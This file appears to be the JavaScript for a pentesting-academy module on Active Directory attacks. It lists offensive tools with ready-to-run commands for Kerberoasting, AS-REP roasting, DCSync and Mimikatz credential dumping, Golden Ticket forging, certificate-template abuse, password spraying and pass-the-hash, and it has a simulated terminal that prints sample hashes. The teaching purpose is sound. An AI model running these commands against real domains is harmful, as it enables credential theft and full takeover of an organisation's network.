// ==========================================
// PWNBOX MODULE 10: ACTIVE DIRECTORY & ENTERPRISE DOMAIN DOMINANCE
// Enterprise Pentesting & Kerberos Exploitation Arsenal
// ==========================================
const apiKey = (typeof window !== "undefined" && window.GROQ_API_KEY) || 
                 (typeof GROQ_API_KEY !== "undefined" ? GROQ_API_KEY : "") || 
                 localStorage.getItem('pwnbox_groq_api_key') || 
                 "";

const MODULE_KEY        = 'module_activedirectory_completed';
const CUSTOM_TOOLS_KEY  = 'ad_custom_tools';
const EDITED_TOOLS_KEY  = 'ad_edited_default_tools';
const DELETED_TOOLS_KEY = 'ad_deleted_default_indices';
const CUSTOM_CATS_KEY   = 'ad_custom_categories';

const defaultTools = [
    {
        name: "1. BloodHound & SharpHound (Attack Graph Engine)",
        link: "https://github.com/BloodHoundAD/BloodHound",
        category: "GraphRecon",
        brief: "The industry-standard Active Directory graph analysis platform. SharpHound queries LDAP, NetAPI, and RPC endpoints to collect security group memberships, local admin rights, ACLs, and Kerberos delegation relationships. BloodHound's graph engine applies Dijkstra's algorithm to compute the shortest visual path from an unprivileged domain user to full Domain Admin.",
        use: "Execute SharpHound collector on target host:<br><code>.\\SharpHound.exe -c All --outputdirectory C:\\temp --zipfilename corp_ad</code><br>Query BloodHound for shortest path to Domain Admins:<br><code>MATCH (m:User {name:'CADET@CORP.LOCAL'}),(n:Group {name:'DOMAIN ADMINS@CORP.LOCAL'}),p=shortestPath((m)-[*1..15]->(n)) RETURN p</code>",
        useful: "In corporate enterprises with 50,000+ domain objects, manual privilege escalation takes weeks. BloodHound highlights obscure ACL chains (e.g., GenericWrite on an IT Support group that resets a Domain Admin password) in seconds."
    },
    {
        name: "2. Impacket Kerberos Suite (GetNPUsers & GetUserSPNs)",
        link: "https://github.com/fortra/impacket",
        category: "KerberosAttacks",
        brief: "Essential collection of Python network protocol scripts for targeting Kerberos authentication. 'GetNPUsers.py' executes AS-REP Roasting against accounts that do not require Kerberos preauthentication (DONT_REQ_PREAUTH), retrieving crackable Kerberos password hashes without domain credentials. 'GetUserSPNs.py' executes Kerberoasting against accounts with registered Service Principal Names (SPNs).",
        use: "AS-REP Roasting (No credentials needed):<br><code>GetNPUsers.py corp.local/ -usersfile users.txt -format hashcat -outputfile asrep.hashes -dc-ip 10.10.10.1</code><br>Kerberoasting (Extract Ticket Granting Service TGS):<br><code>GetUserSPNs.py corp.local/cadet:Password123 -dc-ip 10.10.10.1 -request -outputfile tgs.hashes</code><br>Crack TGS with Hashcat:<br><code>hashcat -m 13100 tgs.hashes /usr/share/wordlists/rockyou.txt</code>",
        useful: "Kerberoasting requires only standard authenticated domain access. Because service accounts often possess high privileges (like SQL or Backup Admins) with weak passwords, cracking the TGS hash directly yields domain elevation."
    },
    {
        name: "3. Mimikatz & DCSync (Credential Extraction)",
        link: "https://github.com/gentilkiwi/mimikatz",
        category: "CredentialExtraction",
        brief: "The legendary post-exploitation suite created by Benjamin Delpy. Abuses the Microsoft Directory Replication Service Remote Protocol (MS-DRSR). The DCSync command mimics a legitimate Domain Controller requesting an active replication synchronization (DSGetNCChanges), extracting the NTLM password hash of any user or the master krbtgt account without executing code on the Domain Controller itself.",
        use: "Extract local LSASS memory credentials:<br><code>privilege::debug</code><br><code>sekurlsa::logonpasswords</code><br>Execute DCSync domain-wide replication:<br><code>lsadump::dcsync /domain:corp.local /user:Administrator</code><br><code>lsadump::dcsync /domain:corp.local /user:krbtgt</code>",
        useful: "Once a tester obtains Replicating Directory Changes permissions (or Domain Admin rights), DCSync provides immediate offline possession of all active enterprise credentials."
    },
    {
        name: "4. Rubeus & Kekeo (Kerberos Ticket Forge)",
        link: "https://github.com/GhostPack/Rubeus",
        category: "TicketManipulation",
        brief: "A C# toolset designed for raw Kerberos interaction and abuse. Allows operators to forge Kerberos Ticket Granting Tickets (TGT Golden Tickets) using the krbtgt NTLM hash, Ticket Granting Service (TGS Silver Tickets) for specific services (CIFS, HTTP, LDAP), perform Overpass-the-Hash, and abuse unconstrained/constrained Kerberos delegation.",
        use: "Forge Golden Ticket valid for 10 years:<br><code>Rubeus.exe golden /rc4:8846f7eaee8fb117ad06bdd830b7586c /domain:corp.local /sid:S-1-5-21-12345-67890 /user:Administrator /ptt</code><br>Execute Overpass-the-Hash to exchange NTLM for TGT:<br><code>Rubeus.exe asktgt /user:Administrator /rc4:31d6cfe0... /ptt</code>",
        useful: "Golden Tickets provide total domain persistence that survives user password changes and gives unrestricted access to every computer, service, and share in the Active Directory forest."
    },
    {
        name: "5. Certipy & PKINIT (AD CS Certificate Abuse)",
        link: "https://github.com/ly4k/Certipy",
        category: "ADCSAbuse",
        brief: "The foremost tool for auditing and abusing Active Directory Certificate Services (AD CS). Discovers misconfigured Certificate Templates across the 8 classic escalation scenarios (ESC1 through ESC8). Under ESC1, any domain user can request a digital certificate while specifying an arbitrary Subject Alternative Name (SAN) such as the Domain Administrator, trading the certificate for full Kerberos TGTs.",
        use: "Audit AD CS infrastructure for vulnerable templates:<br><code>certipy find -u cadet@corp.local -p Password123 -dc-ip 10.10.10.1 -vulnerable</code><br>Exploit ESC1 template requesting Domain Admin cert:<br><code>certipy req -u cadet@corp.local -p Password123 -ca CORP-CA -template VulnerableTemplate -upn administrator@corp.local</code><br>Authenticate with certificate via PKINIT for TGT:<br><code>certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1</code>",
        useful: "AD CS misconfigurations are now the #1 enterprise escalation path because certificate authentication bypasses many standard EDR detections and Kerberos tripwires."
    },
    {
        name: "6. CrackMapExec & NetExec (SMB/WinRM Spraying)",
        link: "https://github.com/Pennyw0rth/NetExec",
        category: "LateralMovement",
        brief: "Multi-protocol network penetration testing tool. Automates password spraying, credential validation, and lateral movement execution across thousands of hosts via SMB, WinRM, WMI, LDAP, MSSQL, and RDP. Automatically tests Pass-the-Hash (PtH) and identifies systems where the operator has Pwn3d! (local admin) status.",
        use: "Password spray entire /24 subnet over SMB:<br><code>netexec smb 10.10.10.0/24 -u users.txt -p 'Winter2026!' --continue-on-success</code><br>Pass-the-Hash to execute command on local admin systems:<br><code>netexec smb 10.10.10.50 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 -x 'whoami'</code><br>Dump SAM database on compromised hosts:<br><code>netexec smb 10.10.10.0/24 -u Admin -p Password --sam</code>",
        useful: "Allows operators to weaponize harvested credentials across the entire enterprise perimeter and identify target pivot points in seconds."
    },
    {
        name: "7. PowerView & ADSI (Native Domain Enumeration)",
        link: "https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon",
        category: "DomainEnumeration",
        brief: "PowerShell script utilizing native .NET and Active Directory Service Interfaces (ADSI) to perform deep Active Directory situational awareness without triggering suspicious binary alerts. Enumerates domain users, computers, Domain Controllers, Service Principal Names, group policies (GPOs), and accessible SMB file shares.",
        use: "Enumerate all domain users with detailed descriptions:<br><code>Get-DomainUser | Select-Object samaccountname, description</code><br>Find computers where current user is local admin:<br><code>Find-LocalAdminAccess</code><br>Identify accounts with Kerberos preauth disabled:<br><code>Get-DomainUser -PreauthNotRequired</code><br>Locate sensitive shared files (passwords, scripts):<br><code>Find-InterestingDomainShareFile</code>",
        useful: "Native PowerShell scripts generate minimal process-creation alerts when executed in constrained language mode or obfuscated in memory."
    }
];

let tools = [];
let editingToolIndex = null;

const categoriesTemplate = {
    "GraphRecon": [],
    "KerberosAttacks": [],
    "CredentialExtraction": [],
    "TicketManipulation": [],
    "ADCSAbuse": [],
    "LateralMovement": [],
    "DomainEnumeration": []
};
const catDisplayNamesTemplate = {
    "GraphRecon": "📊 Attack Graph & BloodHound",
    "KerberosAttacks": "🎟️ Kerberoasting & AS-REP",
    "CredentialExtraction": "🔑 Credential Extraction & DCSync",
    "TicketManipulation": "👑 Kerberos Tickets & Golden",
    "ADCSAbuse": "📜 AD Certificate Services (AD CS)",
    "LateralMovement": "🚀 Lateral Movement & Spraying",
    "DomainEnumeration": "🔎 Native Domain Enumeration"
};
const defaultCategoryOptionsHtml = `
            <option value="GraphRecon">📊 Attack Graph & BloodHound</option>
            <option value="KerberosAttacks">🎟️ Kerberoasting & AS-REP</option>
            <option value="CredentialExtraction">🔑 Credential Extraction & DCSync</option>
            <option value="TicketManipulation">👑 Kerberos Tickets & Golden</option>
            <option value="ADCSAbuse">📜 AD Certificate Services (AD CS)</option>
            <option value="LateralMovement">🚀 Lateral Movement & Spraying</option>
            <option value="DomainEnumeration">🔎 Native Domain Enumeration</option>`;

function init() {
    const list = document.getElementById('toolList');
    if (!list) return;
    list.innerHTML = '';

    const moduleCategories = {};
    for (const k of Object.keys(categoriesTemplate)) moduleCategories[k] = [];
    const moduleCatDisplayNames = { ...catDisplayNamesTemplate };

    try {
        const customCats = JSON.parse(localStorage.getItem(CUSTOM_CATS_KEY) || '{}');
        for (const [k, v] of Object.entries(customCats)) {
            moduleCategories[k] = [];
            moduleCatDisplayNames[k] = v;
        }
    } catch(e) { console.error(e); }

    const defaultCatKey = Object.keys(moduleCategories)[0];
    tools.forEach((tool, index) => {
        const cat = tool.category || defaultCatKey;
        if (moduleCategories[cat]) moduleCategories[cat].push({ tool, index });
        else {
            if (!moduleCategories[defaultCatKey]) moduleCategories[defaultCatKey] = [];
            moduleCategories[defaultCatKey].push({ tool, index });
        }
    });

    for (const [catName, catTools] of Object.entries(moduleCategories)) {
        if (catTools.length === 0) continue;
        const h = document.createElement('div');
        h.className = 'category-header';
        h.innerText = moduleCatDisplayNames[catName] || catName;
        list.appendChild(h);
        catTools.forEach(({ tool, index }) => {
            const div = document.createElement('div');
            div.className = 'tool-item';
            div.innerText = tool.name.split('.')[1]?.trim() || tool.name;
            div.onclick = () => showDetails(index, div);
            list.appendChild(div);
        });
    }

    if (!apiKey) {
        const dot = document.getElementById('statusDot');
        if (dot) dot.classList.remove('online');
        if (typeof addBotMessage === 'function') {
            addBotMessage("⚠️ API key not configured. Please configure GROQ_API_KEY in js/config.js.");
        }
    }
}

function reloadAllTools() {
    tools = defaultTools.map((t, idx) => ({ ...t, originalIndex: idx }));
    try {
        const del = JSON.parse(localStorage.getItem(DELETED_TOOLS_KEY) || '[]');
        tools = tools.filter(t => !del.includes(t.originalIndex));
    } catch(e) {}
    try {
        const edited = JSON.parse(localStorage.getItem(EDITED_TOOLS_KEY) || '{}');
        tools.forEach(t => { if (edited[t.originalIndex]) Object.assign(t, edited[t.originalIndex]); });
    } catch(e) {}
    loadCustomTools();
    init();
}

function showDetails(index, element) {
    document.querySelectorAll('.tool-item').forEach(el => el.classList.remove('active'));
    if (element) element.classList.add('active');
    const tool = tools[index];
    if (!tool) return;
    const catClass = `badge-${(tool.category || '').toLowerCase()}`;
    const displayCatName = (tool.category || '').replace(/_/g, ' ');
    const detailsPanel = document.getElementById('detailsPanel');
    if (!detailsPanel) return;

    detailsPanel.innerHTML = `
        <div class="card">
            <h1 style="display:flex;justify-content:space-between;align-items:center;width:100%;">
                <span>${tool.name.split('.')[1]?.trim() || tool.name}<span class="badge ${catClass}">${displayCatName}</span></span>
                <div style="display:flex;gap:8px;align-items:center;">
                    <button class="btn btn-edit-tool" onclick="openEditToolModal(${index})" style="font-size:0.8rem;padding:6px 12px;">✏️ Edit</button>
                    <button class="btn btn-delete-tool" onclick="confirmDeleteTool(${index})" style="font-size:0.8rem;padding:6px 12px;">🗑️ Delete</button>
                    <a href="${tool.link}" target="_blank" style="font-size:0.8rem;padding:6px 12px;">Launch ↗</a>
                </div>
            </h1>
            <div class="section-label">Simply Explained (What is it?)</div>
            <div class="section-content">${tool.brief}</div>
            <div class="section-label">How to actually use it</div>
            <div class="section-content">${tool.use}</div>
            <div class="section-label">Why Hackers care about this</div>
            <div class="section-content">${tool.useful}</div>
        </div>`;
    if (window.innerWidth <= 768) switchMobileTab('details');
}

function updateCompletionButton() {
    const btn = document.getElementById('completeModuleBtn');
    if (!btn) return;
    const done = localStorage.getItem(MODULE_KEY) === 'true';
    btn.innerText = done ? "✓ Module Completed" : "Mark Module Completed";
    btn.classList.toggle('completed', done);
}

function toggleModuleCompletion() {
    localStorage.setItem(MODULE_KEY, !(localStorage.getItem(MODULE_KEY) === 'true'));
    updateCompletionButton();
}

function openAddToolModal() {
    editingToolIndex = null;
    const title = document.querySelector('#addToolModal h3');
    if (title) title.innerText = "Add Custom Tool";
    const sub = document.querySelector('#addToolForm button[type="submit"]');
    if (sub) sub.innerText = "Add Tool";
    const form = document.getElementById('addToolForm');
    if (form) form.reset();
    cancelNewCategory();
    loadCustomCategories();
    const modal = document.getElementById('addToolModal');
    if (modal) {
        modal.style.display = 'flex';
        modal.offsetHeight;
        modal.classList.add('active');
    }
    const nameInput = document.getElementById('toolName');
    if (nameInput) nameInput.focus();
}

function openEditToolModal(index) {
    editingToolIndex = index;
    const tool = tools[index];
    if (!tool) return;
    const title = document.querySelector('#addToolModal h3');
    if (title) title.innerText = "Edit Tool Info";
    const sub = document.querySelector('#addToolForm button[type="submit"]');
    if (sub) sub.innerText = "Save Changes";
    const form = document.getElementById('addToolForm');
    if (form) form.reset();
    cancelNewCategory();
    loadCustomCategories();
    document.getElementById('toolName').value = tool.name.includes('.') ? tool.name.split('.')[1].trim() : tool.name.trim();
    document.getElementById('toolLink').value = tool.link;
    document.getElementById('toolCategory').value = tool.category;
    document.getElementById('toolBrief').value = tool.brief;
    document.getElementById('toolUse').value = tool.use;
    document.getElementById('toolUseful').value = tool.useful;
    const modal = document.getElementById('addToolModal');
    if (modal) {
        modal.style.display = 'flex';
        modal.offsetHeight;
        modal.classList.add('active');
    }
}

function closeAddToolModal() {
    const modal = document.getElementById('addToolModal');
    if (modal) {
        modal.classList.remove('active');
        setTimeout(() => {
            modal.style.display = 'none';
            const form = document.getElementById('addToolForm');
            if (form) form.reset();
        }, 300);
    }
}

function loadCustomTools() {
    try {
        const stored = localStorage.getItem(CUSTOM_TOOLS_KEY);
        if (stored) {
            JSON.parse(stored).forEach((tool, idx) => {
                const match = tool.name.match(/^\d+\.\s*(.*)$/);
                tool.name = `${tools.length + 1}. ${match ? match[1] : tool.name}`;
                tool.originalIndex = null;
                tool.customIndex = idx;
                tools.push(tool);
            });
        }
    } catch(e) { console.error(e); }
}

function submitNewTool(e) {
    if (e && e.preventDefault) e.preventDefault();
    const vals = {
        name: document.getElementById('toolName').value.trim(),
        link: document.getElementById('toolLink').value.trim(),
        category: document.getElementById('toolCategory').value,
        brief: document.getElementById('toolBrief').value.trim(),
        use: document.getElementById('toolUse').value.trim(),
        useful: document.getElementById('toolUseful').value.trim()
    };

    if (editingToolIndex !== null) {
        const orig = tools[editingToolIndex];
        if (orig && orig.originalIndex !== null) {
            const edited = JSON.parse(localStorage.getItem(EDITED_TOOLS_KEY) || '{}');
            edited[orig.originalIndex] = vals;
            localStorage.setItem(EDITED_TOOLS_KEY, JSON.stringify(edited));
        } else if (orig) {
            const ct = JSON.parse(localStorage.getItem(CUSTOM_TOOLS_KEY) || '[]');
            ct[orig.customIndex] = vals;
            localStorage.setItem(CUSTOM_TOOLS_KEY, JSON.stringify(ct));
        }
    } else {
        const ct = JSON.parse(localStorage.getItem(CUSTOM_TOOLS_KEY) || '[]');
        ct.push(vals);
        localStorage.setItem(CUSTOM_TOOLS_KEY, JSON.stringify(ct));
    }

    closeAddToolModal();
    reloadAllTools();
    setTimeout(() => {
        let foundIndex = 0, newToolEl = null;
        tools.forEach((t, idx) => {
            if ((t.name.includes('.') ? t.name.split('.')[1].trim() : t.name.trim()) === vals.name) foundIndex = idx;
        });
        document.querySelectorAll('.tool-item').forEach(el => {
            if (el.innerText === vals.name) newToolEl = el;
        });
        if (newToolEl) showDetails(foundIndex, newToolEl);
    }, 100);
}

function confirmDeleteTool(index) {
    const rawName = tools[index].name.includes('.') ? tools[index].name.split('.')[1].trim() : tools[index].name.trim();
    if (typeof window.tacticalConfirm === 'function') {
        window.tacticalConfirm({
            title: "DELETE CUSTOM TOOL",
            message: `Are you sure you want to delete "${rawName}" from your active tool arsenal?`,
            confirmText: "🗑️ DELETE TOOL",
            cancelText: "CANCEL",
            type: "danger",
            onConfirm: () => deleteTool(index)
        });
    } else if (confirm(`Are you sure you want to delete "${rawName}"?`)) {
        deleteTool(index);
    }
}

function deleteTool(index) {
    const tool = tools[index];
    if (!tool) return;
    if (tool.originalIndex !== null) {
        const del = JSON.parse(localStorage.getItem(DELETED_TOOLS_KEY) || '[]');
        if (!del.includes(tool.originalIndex)) {
            del.push(tool.originalIndex);
            localStorage.setItem(DELETED_TOOLS_KEY, JSON.stringify(del));
        }
    } else {
        const ct = JSON.parse(localStorage.getItem(CUSTOM_TOOLS_KEY) || '[]');
        ct.splice(tool.customIndex, 1);
        localStorage.setItem(CUSTOM_TOOLS_KEY, JSON.stringify(ct));
    }
    reloadAllTools();
    document.getElementById('detailsPanel').innerHTML = `<div style="text-align:center;color:var(--text-muted);margin-top:20vh;"><h3>Select a tool from the menu to view beginner-friendly intelligence data.</h3></div>`;
}

function loadCustomCategories() {
    try {
        const customCats = JSON.parse(localStorage.getItem(CUSTOM_CATS_KEY) || '{}');
        const sel = document.getElementById('toolCategory');
        if (!sel) return;
        sel.innerHTML = defaultCategoryOptionsHtml;
        for (const [k, v] of Object.entries(customCats)) {
            sel.innerHTML += `<option value="${k}">${v}</option>`;
        }
    } catch(e) { console.error(e); }
}

function showNewCategoryForm() {
    const grp = document.getElementById('newCategoryGroup');
    if (grp) grp.style.display = 'block';
    const nameInput = document.getElementById('newCategoryName');
    if (nameInput) nameInput.focus();
}

function cancelNewCategory() {
    const grp = document.getElementById('newCategoryGroup');
    if (grp) grp.style.display = 'none';
    const n = document.getElementById('newCategoryName');
    if (n) n.value = '';
    const i = document.getElementById('newCategoryIcon');
    if (i) i.value = '';
}

function saveNewCategory() {
    const name = document.getElementById('newCategoryName').value.trim();
    const icon = document.getElementById('newCategoryIcon').value.trim() || '⚙️';
    if (!name) return;
    const key = name.replace(/\s+/g, '');
    const label = `${icon} ${name}`;
    try {
        const customCats = JSON.parse(localStorage.getItem(CUSTOM_CATS_KEY) || '{}');
        customCats[key] = label;
        localStorage.setItem(CUSTOM_CATS_KEY, JSON.stringify(customCats));
        loadCustomCategories();
        document.getElementById('toolCategory').value = key;
        cancelNewCategory();
    } catch(e) { console.error(e); }
}

function switchMobileTab(tabId) {
    document.querySelectorAll('.nav-tab').forEach(btn => btn.classList.toggle('active', btn.getAttribute('onclick').includes(tabId)));
    document.body.className = document.body.className.replace(/\btab-\w+\b/g,'').trim();
    document.body.classList.add('tab-' + tabId);
}

window.openAddToolModal = openAddToolModal;
window.openEditToolModal = openEditToolModal;
window.closeAddToolModal = closeAddToolModal;
window.submitNewTool = submitNewTool;
window.confirmDeleteTool = confirmDeleteTool;
window.showNewCategoryForm = showNewCategoryForm;
window.cancelNewCategory = cancelNewCategory;
window.saveNewCategory = saveNewCategory;
window.switchMobileTab = switchMobileTab;
window.toggleModuleCompletion = toggleModuleCompletion;
window.showDetails = showDetails;
window.reloadAllTools = reloadAllTools;
// --- PANEL TAB SWITCHING ---
function switchPanelTab(tabName) {
    document.querySelectorAll('.panel-tab').forEach(b => b.classList.remove('active'));
    document.querySelectorAll('.tab-content').forEach(c => {
        c.classList.remove('active');
        c.style.display = 'none';
    });

    if (tabName === 'chat') {
        const btn = document.querySelector(".panel-tab[onclick*='chat']");
        if (btn) btn.classList.add('active');
        const cont = document.getElementById('chatTabContent');
        if (cont) { cont.classList.add('active'); cont.style.display = 'flex'; }
    } else if (tabName === 'terminal') {
        const btn = document.querySelector(".panel-tab[onclick*='terminal']");
        if (btn) btn.classList.add('active');
        const cont = document.getElementById('terminalTabContent');
        if (cont) { cont.classList.add('active'); cont.style.display = 'flex'; }
    } else if (tabName === 'quiz') {
        const btn = document.querySelector(".panel-tab[onclick*='quiz']");
        if (btn) btn.classList.add('active');
        const cont = document.getElementById('quizTabContent');
        if (cont) { cont.classList.add('active'); cont.style.display = 'flex'; }
    }
}

// --- TERMINAL COMMAND SANDBOX ---
function handleTerminalEnter(e) {
    if (e.key === 'Enter') {
        const input = document.getElementById('terminalInput');
        const cmd = input.value.trim().toLowerCase();
        input.value = '';
        executeTerminalCommand(cmd);
    }
}

function executeTerminalCommand(cmd) {
    const output = document.getElementById('terminalOutput');
    if (!output) return;

    const row = document.createElement('div');
    row.style.marginBottom = '6px';
    row.innerHTML = `<span style="color: #fdba74;">operator@corp.local:~$</span> <span style="color: #ffffff;">${cmd}</span>`;
    output.appendChild(row);

    const res = document.createElement('div');
    res.style.marginBottom = '12px';

    if (cmd === 'help') {
        res.innerHTML = `
            <div style="color: #ea580c; font-weight: bold;">AVAILABLE ACTIVE DIRECTORY COMMANDS:</div>
            <div>- <b>kerberoast</b>: Request Ticket Granting Service (TGS) ticket for crackable service SPN</div>
            <div>- <b>asrep-roast</b>: Extract AS-REP hash for accounts with Kerberos preauth disabled</div>
            <div>- <b>dcsync</b>: Execute remote MS-DRSR synchronization of Administrator and krbtgt hashes</div>
            <div>- <b>bloodhound-query</b>: Compute shortest graph path to Domain Admins</div>
            <div>- <b>clear</b>: Clear terminal display</div>
        `;
    } else if (cmd === 'kerberoast') {
        res.innerHTML = `
            <span style="color: #10b981;">[*] Querying LDAP for ServicePrincipalNames in corp.local...<br/>
            [+] Found SPN: MSSQLSvc/sql01.corp.local:1433 (Account: svc_sql_admin)<br/>
            [+] Requesting Kerberos TGS Ticket from DC 10.10.10.1...<br/>
            [+] TGS Encrypted with svc_sql_admin RC4/NTLM secret received!<br/>
            [✓] EXTRACTED KERBEROAST HASH (Hashcat Mode 13100):<br/>
            &nbsp;&nbsp;$krb5tgs$23$*svc_sql_admin*CORP.LOCAL*$MSSQLSvc/sql01.corp.local:1433*...$f8a1293b04c81...</span>
        `;
    } else if (cmd === 'asrep-roast') {
        res.innerHTML = `
            <span style="color: #eab308;">[*] Querying Domain Controller for accounts with DONT_REQ_PREAUTH flag...<br/>
            [+] Target identified: CORP\\svc_backup<br/>
            [+] Transmitting AS-REQ to KDC (10.10.10.1)...<br/>
            [+] Received AS-REP containing encrypted timestamp!<br/>
            [✓] EXTRACTED AS-REP HASH (Hashcat Mode 18200):<br/>
            &nbsp;&nbsp;$krb5asrep$23$svc_backup@CORP.LOCAL:3a89e17b82c...</span>
        `;
    } else if (cmd === 'dcsync') {
        res.innerHTML = `
            <span style="color: #f43f5e;">[*] Initiating MS-DRSR DSGetNCChanges replication request to DC01.corp.local...<br/>
            [+] User Replication Permission Verified: OK<br/>
            [✓] DCSYNC REPLICATION DUMP:<br/>
            &nbsp;&nbsp;Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br/>
            &nbsp;&nbsp;krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::<br/>
            [+] Master krbtgt key harvested: Domain Administrator Golden Ticket forgeable.</span>
        `;
    } else if (cmd === 'bloodhound-query') {
        res.innerHTML = `
            <span style="color: #38bdf8;">[*] Ingesting Active Directory session and ACL database...<br/>
            [+] Calculating shortest path from CORP\\Cadet to CORP\\Domain Admins:<br/>
            &nbsp;&nbsp;Step 1: CORP\\Cadet -> MemberOf -> [Tier-2 HelpDesk]<br/>
            &nbsp;&nbsp;Step 2: [Tier-2 HelpDesk] -> GenericWrite -> [CORP\\BackupAdmin]<br/>
            &nbsp;&nbsp;Step 3: [CORP\\BackupAdmin] -> MemberOf -> [Domain Admins]<br/>
            [✓] CRITICAL ATTACK PATH DETECTED: 2 hops to Domain Admin via GenericWrite ACL abuse.</span>
        `;
    } else if (cmd === 'clear') {
        output.innerHTML = '';
        return;
    } else {
        res.innerHTML = `<span style="color: #ef4444;">Command not recognized. Type 'help' to view Active Directory commands.</span>`;
    }

    output.appendChild(res);
    output.scrollTop = output.scrollHeight;
}

// --- QUIZ VERIFICATION ---
function checkQuizAnswer(qNum, correctVal) {
    const selected = document.querySelector(`input[name="q${qNum}"]:checked`);
    if (!selected) return;

    if (selected.value === correctVal) {
        if (typeof window.showCustomAlert === 'function') {
            window.showCustomAlert("✓ CORRECT!", "Outstanding! You correctly identified the Active Directory attack mechanism.", "success");
        } else if (typeof window.tacticalAlert === 'function') {
            window.tacticalAlert({ title: "✓ CORRECT!", message: "Outstanding! You correctly identified the Active Directory mechanism.", type: "success" });
        } else {
            alert("✓ CORRECT! That is the proper Active Directory mechanism.");
        }
    } else {
        if (typeof window.showCustomAlert === 'function') {
            window.showCustomAlert("✕ INCORRECT", "Review the Kerberos and Domain Controller notes and try again.", "error");
        } else if (typeof window.tacticalAlert === 'function') {
            window.tacticalAlert({ title: "✕ INCORRECT", message: "Review the Active Directory notes and try again.", type: "danger" });
        } else {
            alert("✕ INCORRECT. Review the Active Directory notes.");
        }
    }
}

// --- AI MENTOR (GROQ INTEGRATION) ---
async function sendMessage() {
    const input = document.getElementById('chatInput');
    const msg = input.value.trim();
    if (!msg) return;

    const history = document.getElementById('chatHistory');
    const userDiv = document.createElement('div');
    userDiv.className = 'msg user';
    userDiv.textContent = msg;
    history.appendChild(userDiv);
    input.value = '';

    const botDiv = document.createElement('div');
    botDiv.className = 'msg bot';
    botDiv.textContent = 'Querying Active Directory Mentor...';
    history.appendChild(botDiv);
    history.scrollTop = history.scrollHeight;

    try {
        let content = '';
        if (typeof window !== "undefined" && window.GroqService && window.GroqService.callGroqChat) {
            const data = await window.GroqService.callGroqChat({
                model: "llama-3.3-70b-versatile",
                messages: [
                    {
                        role: "system",
                        content: "You are an expert Active Directory and Windows Enterprise Penetration Testing Mentor on the PwnBox cybersecurity academy. Explain Kerberos authentication, BloodHound graphs, ticket forging, and privilege escalation with concrete examples and Hinglish analogies if appropriate."
                    },
                    { role: "user", content: msg }
                ],
                temperature: 0.5,
                max_tokens: 600
            });
            content = data.choices[0].message.content;
        } else {
            const response = await fetch("https://api.groq.com/openai/v1/chat/completions", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                    "Authorization": `Bearer ${apiKey}`
                },
                body: JSON.stringify({
                    model: "llama-3.3-70b-versatile",
                    messages: [
                        {
                            role: "system",
                            content: "You are an expert Active Directory and Windows Enterprise Penetration Testing Mentor on the PwnBox cybersecurity academy. Explain Kerberos authentication, BloodHound graphs, ticket forging, and privilege escalation with concrete examples and Hinglish analogies if appropriate."
                        },
                        { role: "user", content: msg }
                    ],
                    temperature: 0.5,
                    max_tokens: 600
                })
            });

            if (!response.ok) throw new Error("API request failed");
            const data = await response.json();
            content = data.choices[0].message.content;
        }
        botDiv.textContent = content;
    } catch (e) {
        botDiv.textContent = "Downlink failed. Ensure Groq API key is valid in js/config.js or test commands in the AD CLI Sandbox tab.";
    }
    history.scrollTop = history.scrollHeight;
}

function handleEnter(e) {
    if (e.key === 'Enter') sendMessage();
}

document.addEventListener('DOMContentLoaded', () => {
    reloadAllTools();
    updateCompletionButton();
});
